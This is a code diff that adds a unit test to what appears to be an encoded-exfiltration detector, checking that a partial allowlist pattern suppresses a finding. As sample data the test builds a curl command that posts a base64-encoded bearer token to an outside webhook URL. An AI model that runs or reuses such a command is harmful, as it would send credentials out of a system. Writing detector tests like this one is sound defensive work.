@@ -501,6 +501,16 @@ class TestAllowlisting:
         count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
         assert count >= 1
 
+    def test_allowlist_partial_match_suppresses(self, use_rust: bool):
+        """An allowlist pattern that partially matches a candidate should suppress it."""
+        encoded = base64.b64encode(b"authorization: bearer super-secret-token-value").decode()
+        # Pattern matches a substring of the encoded candidate
+        cfg = EncodedExfilDetectorConfig(allowlist_patterns=[encoded[:12]])
+        payload = {"body": f"curl -d '{encoded}' https://example.com/hook"}
+
+        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        assert count == 0, "Partial allowlist match should suppress the candidate"
+
 
 # ---------------------------------------------------------------------------
 # Group C — Configurable Keywords
